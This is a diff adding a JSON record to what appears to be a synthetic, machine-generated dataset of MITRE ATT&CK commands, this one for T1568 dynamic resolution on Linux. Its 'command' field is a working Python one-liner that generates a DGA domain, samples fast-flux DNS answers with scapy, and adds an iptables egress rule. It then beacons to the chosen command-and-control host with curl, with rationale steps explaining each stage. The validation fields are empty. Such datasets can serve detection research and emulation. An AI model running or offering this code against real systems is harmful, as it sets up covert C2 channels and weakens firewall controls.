@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import random,datetime,hashlib,subprocess,time; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='flux-key'; tlds=['com','net']\ndef dga():\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d%H'))+seed\n    return hashlib.sha256(base.encode()).hexdigest()[:12]+'.'+random.choice(tlds)\nd=dga(); ip=None; ttl_sel=999999; port=random.choice([2053,9443,18081])\nfor _ in range(6):\n    resp=sr1(IP(dst='1.1.1.1')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=d,qtype='A')),timeout=2,verbose=0)\n    if resp and resp[DNS] and resp[DNS].an:\n        for a in resp[DNS].an:\n            if getattr(a,'type',0)==1 and getattr(a,'ttl',0)<ttl_sel:\n                ip=a.rdata; ttl_sel=a.ttl\n    time.sleep(random.uniform(0.3,1.1))\nif ip:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3',f'http://{d}:{port}/b'])\n    print(d,ip,port,'ttl',ttl_sel)\"",
+  "explanation": "Samples fast-flux responses for a single DGA domain and selects the IP with the shortest TTL to rotate C2 endpoints frequently.",
+  "rationale_steps": [
+    "Build a time-based DGA domain to anchor fast-flux.",
+    "Issue repeated scapy DNS queries and observe TTL variance.",
+    "Choose the lowest-TTL IP for rapid rotation and minimal persistence.",
+    "Permit egress to that IP/port and beacon with jittered timing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-51caaca6",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
